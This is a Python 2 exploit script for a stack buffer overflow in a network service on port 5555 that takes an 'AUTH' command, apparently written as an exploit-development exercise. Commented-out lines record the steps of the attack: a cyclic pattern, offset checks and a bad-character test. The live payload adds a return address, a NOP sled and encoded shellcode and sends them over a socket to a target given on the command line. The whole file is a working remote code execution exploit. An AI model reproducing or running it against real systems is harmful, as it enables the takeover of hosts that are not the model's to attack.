#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

shellcode=(
"\xdb\xdc\xd9\x74\x24\xf4\xba\x77\xe5\xb9\x95\x5d\x31\xc9\xb1"
"\x52\x83\xed\xfc\x31\x55\x13\x03\x22\xf6\x5b\x60\x30\x10\x19"
"\x8b\xc8\xe1\x7e\x05\x2d\xd0\xbe\x71\x26\x43\x0f\xf1\x6a\x68"
"\xe4\x57\x9e\xfb\x88\x7f\x91\x4c\x26\xa6\x9c\x4d\x1b\x9a\xbf"
"\xcd\x66\xcf\x1f\xef\xa8\x02\x5e\x28\xd4\xef\x32\xe1\x92\x42"
"\xa2\x86\xef\x5e\x49\xd4\xfe\xe6\xae\xad\x01\xc6\x61\xa5\x5b"
"\xc8\x80\x6a\xd0\x41\x9a\x6f\xdd\x18\x11\x5b\xa9\x9a\xf3\x95"
"\x52\x30\x3a\x1a\xa1\x48\x7b\x9d\x5a\x3f\x75\xdd\xe7\x38\x42"
"\x9f\x33\xcc\x50\x07\xb7\x76\xbc\xb9\x14\xe0\x37\xb5\xd1\x66"
"\x1f\xda\xe4\xab\x14\xe6\x6d\x4a\xfa\x6e\x35\x69\xde\x2b\xed"
"\x10\x47\x96\x40\x2c\x97\x79\x3c\x88\xdc\x94\x29\xa1\xbf\xf0"
"\x9e\x88\x3f\x01\x89\x9b\x4c\x33\x16\x30\xda\x7f\xdf\x9e\x1d"
"\x7f\xca\x67\xb1\x7e\xf5\x97\x98\x44\xa1\xc7\xb2\x6d\xca\x83"
"\x42\x91\x1f\x03\x12\x3d\xf0\xe4\xc2\xfd\xa0\x8c\x08\xf2\x9f"
"\xad\x33\xd8\xb7\x44\xce\x8b\xbd\x93\xd0\x7c\xaa\xa1\xd0\x83"
"\x91\x2f\x36\xe9\xf5\x79\xe1\x86\x6c\x20\x79\x36\x70\xfe\x04"
"\x78\xfa\x0d\xf9\x37\x0b\x7b\xe9\xa0\xfb\x36\x53\x66\x03\xed"
"\xfb\xe4\x96\x6a\xfb\x63\x8b\x24\xac\x24\x7d\x3d\x38\xd9\x24"
"\x97\x5e\x20\xb0\xd0\xda\xff\x01\xde\xe3\x72\x3d\xc4\xf3\x4a"
"\xbe\x40\xa7\x02\xe9\x1e\x11\xe5\x43\xd1\xcb\xbf\x38\xbb\x9b"
"\x46\x73\x7c\xdd\x46\x5e\x0a\x01\xf6\x37\x4b\x3e\x37\xd0\x5b"
"\x47\x25\x40\xa3\x92\xed\x60\x46\x36\x18\x09\xdf\xd3\xa1\x54"
"\xe0\x0e\xe5\x60\x63\xba\x96\x96\x7b\xcf\x93\xd3\x3b\x3c\xee"
"\x4c\xae\x42\x5d\x6c\xfb")

#req1 = "AUTH " + "\x41"*1072
#req1 = "AUTH " + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6B"
#req1 = "AUTH " + "\x41"*1040 + "\x42"*4 + "\x43"*(1072 - 1040 - 4)
#req1 = "AUTH " + "\x41"*1040 + "\x42"*4 + "\x43"*(1072 - 1040 - 4 + 370)
#req1 = "AUTH " + "\x41"*1040 + "\x42"*4 + badchars
# 65D11D71
req1 = "AUTH " + "\x41"*1040 + "\x71\x1d\xd1\x65" + "\x90"*16 + shellcode

s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
